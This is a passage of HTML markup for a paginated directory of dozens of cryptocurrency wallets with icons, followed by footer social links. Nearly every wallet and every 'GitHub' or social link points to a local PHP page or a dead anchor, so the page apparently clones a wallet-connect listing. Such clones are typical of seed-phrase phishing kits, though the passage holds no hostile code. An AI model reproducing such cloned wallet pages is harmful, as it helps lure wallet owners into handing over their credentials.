				<div class="pg4" style="display: none;">
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/yitoken.jpeg" alt="yiToken">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								yiToken
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/did.jpeg" alt="Did Wallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Did Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/steak.jpeg" alt="Steakwallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Steakwallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/gd.jpeg" alt="GD Wallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								GD Wallet
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/binana.jpeg" alt="Binana">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Binana
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/airgap.jpeg" alt="AirGap">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								AirGap
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/orange.jpeg" alt="Orange">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Orange
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/avacus.jpeg" alt="Avacus">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Avacus
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/krystal.jpeg" alt="Krystal">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Krystal
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/linen.jpeg" alt="Linen">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Linen
							</div>
						</div> 
					</a>			
					<a rel="noreferrer noopener" href="ronin.php.html">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq10">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/ronin.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Ronin
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/tronlink.330be608.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								TronLink
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/atomic.a2bb6f98.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Atomic
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/coinomi.48bb4912.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Coinomi
							</div>
						</div>
					</a>


					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/authereum.9fc6b1c3.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Authereum
							</div>
						</div> 
					</a>


					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/gridplus.87a9dc29.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								GridPlue
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/coolwallet.3a4392c5.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Cool Wallet S
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/alice.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Alice
							</div>
						</div> </a>

				</div>
				
				
				<div class="pg5" style="display: none;">
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/tokenary.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Tokenary
							</div>
						</div> </a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/equal.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Equal
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/infinito.47c9c6e7.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Infinito
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/walleth.ae2bda7a.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Walleth
							</div>
						</div> </a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/spatium.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Spatium
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/wallet.io.b76f6e0c.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Wallet.io
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/infinity-wallet.fa160fcf.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Infinity Wallet
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/ownbit.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Ownbit
							</div>
						</div> </a>



					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/via.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								ViaWallet
							</div>
						</div> </a>





					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/vision.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Vision
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/swift.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								SWFT Wallet
							</div>
						</div> </a>




					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/xdc.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								XDC Wallet
							</div>
						</div> </a>



					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/meet-one.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								MEET.ONE
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/dok.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Dok Wallet
							</div>
						</div> </a><a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/at.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								AT.Wallet
							</div>
						</div> </a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/morix.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								MoriX Wallet
							</div>
						</div> </a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/midas.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Midas Wallet
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/trust.png" alt="TrustVault">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								TrustVault
							</div>
						</div>
					</a>
				</div>
				
				<div class="pg6" style="display: none;">
					
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/binance.png" alt="Binance smart chain">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Binance smart chain
							</div>
						</div>
					</a>



					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/loopring.jpg" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Loopring wallet
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/ledger.png" alt="Ledger live">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Ledger live
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/maiar.png" alt="Maiar">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Maiar
							</div>
						</div>
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/parity.png" alt="Parity signer">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Parity signer
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/blockchain.png" alt="Blockchain">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Blockchain
							</div>
						</div>
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/mew.png" alt="Mew Wallet">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Mew Wallet
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/polka.png" alt="Polkadot">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Polkadot
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/xrp.png" alt="Xrp">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Xrp
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/mykey.073a27c9.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								MYKEY
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/stella.png" alt="Stellar">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Stellar
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/tezos.png" alt="Tezos">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Tezos
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/theta.png" alt="Theta">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Theta
							</div>
						</div>
					</a>
					
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/imtoken.6bd18cb3.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								imToken
							</div>
						</div> 
					</a>

					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/onto.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								ONTO
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/tokenpocket.b7c388ce.png" alt="Rainbow">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Token Pocket
							</div>
						</div> 
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/icon.jpg" alt="Icon">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Icon
							</div>
						</div>
					</a>
					<a target="_self" rel="noreferrer noopener" href="wallets.php.html#">
						<div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
							<div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
								<img src="wallet/exodus.png" alt="Exodus">
							</div>
							<div class="pageStyles__SAppName-sc-1navawn-7 eodRCW">
								Exodus
							</div>
						</div>
					</a>
				</div>
				
				
				
				
				
			</div>

			<div class="pagination">
				<ul class="pagination">
					<li class="page-link page1">1</li>
					<li class="page-link page2">2</li>
					<li class="page-link page3">3</li>
					<li class="page-link page4">4</li>
					<li class="page-link page5">5</li>
					<li class="page-link page6">6</li>
				</ul>
			</div>


			<div class="pageStyles__SFootNote-sc-1navawn-8 ceWocr">
				<p>
					Open a pull request on
					<a href="index.html#" target="_self" rel="noreferrer noopener">Github</a>
					to add your wallet here.
				</p>
			</div>
		</section>
						<footer>
							<a href="index.html#" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
								<div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM">
									<img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+RGlzY29yZCBpY29uPC90aXRsZT48ZyBmaWxsPSJyZ2IoODgsIDExMiwgMTM1KSI+PHBhdGggZD0iTTIwLjIyMiAwYzEuNDA2IDAgMi41NCAxLjEzNyAyLjYwNyAyLjQ3NVYyNGwtMi42NzctMi4yNzMtMS40Ny0xLjMzOC0xLjYwNC0xLjM5OC42NyAyLjIwNUgzLjcxYy0xLjQwMiAwLTIuNTQtMS4wNjUtMi41NC0yLjQ3NlYyLjQ4QzEuMTcgMS4xNDIgMi4zMS4wMDMgMy43MTUuMDAzaDE2LjVMMjAuMjIyIDB6bS02LjExOCA1LjY4M2gtLjAzbC0uMjAyLjJjMi4wNzMuNiAzLjA3NiAxLjUzNyAzLjA3NiAxLjUzNy0xLjMzNi0uNjY4LTIuNTQtMS4wMDItMy43NDQtMS4xMzctLjg3LS4xMzUtMS43NC0uMDY0LTIuNDc1IDBoLS4yYy0uNDcgMC0xLjQ3LjItMi44MS43MzUtLjQ2Ny4yMDMtLjczNS4zMzYtLjczNS4zMzZzMS4wMDItMS4wMDIgMy4yMS0xLjUzN2wtLjEzNS0uMTM1cy0xLjY3Mi0uMDY0LTMuNDc3IDEuMjdjMCAwLTEuODA1IDMuMTQ0LTEuODA1IDcuMDIgMCAwIDEgMS43NCAzLjc0MyAxLjgwNiAwIDAgLjQtLjUzMy44MDUtMS4wMDItMS41NC0uNDY4LTIuMTQtMS40MDQtMi4xNC0xLjQwNHMuMTM0LjA2Ni4zMzUuMmguMDZjLjAzIDAgLjA0NC4wMTUuMDYuMDN2LjAwNmMuMDE2LjAxNi4wMy4wMy4wNi4wMy4zMy4xMzYuNjYuMjcuOTMuNC40NjYuMjAyIDEuMDY1LjQwMyAxLjguNTM2LjkzLjEzNSAxLjk5Ni4yIDMuMjEgMCAuNi0uMTM1IDEuMi0uMjY3IDEuOC0uNTM1LjM5LS4yLjg3LS40IDEuMzk3LS43MzcgMCAwLS42LjkzNi0yLjIwNSAxLjQwNC4zMy40NjYuNzk1IDEgLjc5NSAxIDIuNzQ0LS4wNiAzLjgxLTEuOCAzLjg3LTEuNzI2IDAtMy44Ny0xLjgxNS03LjAyLTEuODE1LTcuMDItMS42MzUtMS4yMTQtMy4xNjUtMS4yNi0zLjQzNS0xLjI2bC4wNTYtLjAyem0uMTY4IDQuNDEzYy43MDMgMCAxLjI3LjYgMS4yNyAxLjMzNSAwIC43NC0uNTcgMS4zNC0xLjI3IDEuMzQtLjcgMC0xLjI3LS42LTEuMjctMS4zMzQuMDAyLS43NC41NzMtMS4zMzggMS4yNy0xLjMzOHptLTQuNTQzIDBjLjcgMCAxLjI2Ni42IDEuMjY2IDEuMzM1IDAgLjc0LS41NyAxLjM0LTEuMjcgMS4zNC0uNyAwLTEuMjctLjYtMS4yNy0xLjMzNCAwLS43NC41Ny0xLjMzOCAxLjI3LTEuMzM4eiIvPjwvZz48L3N2Zz4=" alt="Discord">
								</div>
								<p>Discord</p> </a><a href="index.html#" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
								<div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM">
									<img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgdmlld0JveD0iMCAwIDI0IDI0Ij48dGl0bGU+VGVsZWdyYW0gaWNvbjwvdGl0bGU+PGcgZmlsbD0icmdiKDg4LCAxMTIsIDEzNSkiPjxwYXRoIGQ9Ik0yMy45MSAzLjc5TDIwLjMgMjAuODRjLS4yNSAxLjIxLS45OCAxLjUtMiAuOTRsLTUuNS00LjA3LTIuNjYgMi41N2MtLjMuMy0uNTUuNTYtMS4xLjU2LS43MiAwLS42LS4yNy0uODQtLjk1TDYuMyAxMy43bC01LjQ1LTEuN2MtMS4xOC0uMzUtMS4xOS0xLjE2LjI2LTEuNzVsMjEuMjYtOC4yYy45Ny0uNDMgMS45LjI0IDEuNTMgMS43M3oiLz48L2c+PC9zdmc+" alt="Telegram">
								</div>
								<p>Telegram</p> </a><a href="index.html#" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
								<div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM">
									<img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+VHdpdHRlciBpY29uPC90aXRsZT48ZyBmaWxsPSJyZ2IoODgsIDExMiwgMTM1KSI+PHBhdGggZD0iTTIzLjk1NCA0LjU2OWMtLjg4NS4zODktMS44My42NTQtMi44MjUuNzc1IDEuMDE0LS42MTEgMS43OTQtMS41NzQgMi4xNjMtMi43MjMtLjk1MS41NTUtMi4wMDUuOTU5LTMuMTI3IDEuMTg0LS44OTYtLjk1OS0yLjE3My0xLjU1OS0zLjU5MS0xLjU1OS0yLjcxNyAwLTQuOTIgMi4yMDMtNC45MiA0LjkxNyAwIC4zOS4wNDUuNzY1LjEyNyAxLjEyNEM3LjY5MSA4LjA5NCA0LjA2NiA2LjEzIDEuNjQgMy4xNjFjLS40MjcuNzIyLS42NjYgMS41NjEtLjY2NiAyLjQ3NSAwIDEuNzEuODcgMy4yMTMgMi4xODggNC4wOTYtLjgwNy0uMDI2LTEuNTY2LS4yNDgtMi4yMjgtLjYxNnYuMDYxYzAgMi4zODUgMS42OTMgNC4zNzQgMy45NDYgNC44MjctLjQxMy4xMTEtLjg0OS4xNzEtMS4yOTYuMTcxLS4zMTQgMC0uNjE1LS4wMy0uOTE2LS4wODYuNjMxIDEuOTUzIDIuNDQ1IDMuMzc3IDQuNjA0IDMuNDE3LTEuNjggMS4zMTktMy44MDkgMi4xMDUtNi4xMDIgMi4xMDUtLjM5IDAtLjc3OS0uMDIzLTEuMTctLjA2NyAyLjE4OSAxLjM5NCA0Ljc2OCAyLjIwOSA3LjU1NyAyLjIwOSA5LjA1NCAwIDEzLjk5OS03LjQ5NiAxMy45OTktMTMuOTg2IDAtLjIwOSAwLS40Mi0uMDE1LS42My45NjEtLjY4OSAxLjgtMS41NiAyLjQ2LTIuNTQ4bC0uMDQ3LS4wMnoiLz48L2c+PC9zdmc+" alt="Twitter">
								</div>
								<p>Twitter</p> </a><a href="index.html#" target="blank" rel="noreferrer noopener" class="Footer__SExternalLink-sc-1k47aoh-2 YwSGw">
								<div class="Footer__SSocialIcon-sc-1k47aoh-1 hvbAKM">
									<img src="data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+R2l0SHViIGljb248L3RpdGxlPjxnIGZpbGw9InJnYig4OCwgMTEyLCAxMzUpIj48cGF0aCBkPSJNMTIgLjI5N2MtNi42MyAwLTEyIDUuMzczLTEyIDEyIDAgNS4zMDMgMy40MzggOS44IDguMjA1IDExLjM4NS42LjExMy44Mi0uMjU4LjgyLS41NzcgMC0uMjg1LS4wMS0xLjA0LS4wMTUtMi4wNC0zLjMzOC43MjQtNC4wNDItMS42MS00LjA0Mi0xLjYxQzQuNDIyIDE4LjA3IDMuNjMzIDE3LjcgMy42MzMgMTcuN2MtMS4wODctLjc0NC4wODQtLjcyOS4wODQtLjcyOSAxLjIwNS4wODQgMS44MzggMS4yMzYgMS44MzggMS4yMzYgMS4wNyAxLjgzNSAyLjgwOSAxLjMwNSAzLjQ5NS45OTguMTA4LS43NzYuNDE3LTEuMzA1Ljc2LTEuNjA1LTIuNjY1LS4zLTUuNDY2LTEuMzMyLTUuNDY2LTUuOTMgMC0xLjMxLjQ2NS0yLjM4IDEuMjM1LTMuMjItLjEzNS0uMzAzLS41NC0xLjUyMy4xMDUtMy4xNzYgMCAwIDEuMDA1LS4zMjIgMy4zIDEuMjMuOTYtLjI2NyAxLjk4LS4zOTkgMy0uNDA1IDEuMDIuMDA2IDIuMDQuMTM4IDMgLjQwNSAyLjI4LTEuNTUyIDMuMjg1LTEuMjMgMy4yODUtMS4yMy42NDUgMS42NTMuMjQgMi44NzMuMTIgMy4xNzYuNzY1Ljg0IDEuMjMgMS45MSAxLjIzIDMuMjIgMCA0LjYxLTIuODA1IDUuNjI1LTUuNDc1IDUuOTIuNDIuMzYuODEgMS4wOTYuODEgMi4yMiAwIDEuNjA2LS4wMTUgMi44OTYtLjAxNSAzLjI4NiAwIC4zMTUuMjEuNjkuODI1Lj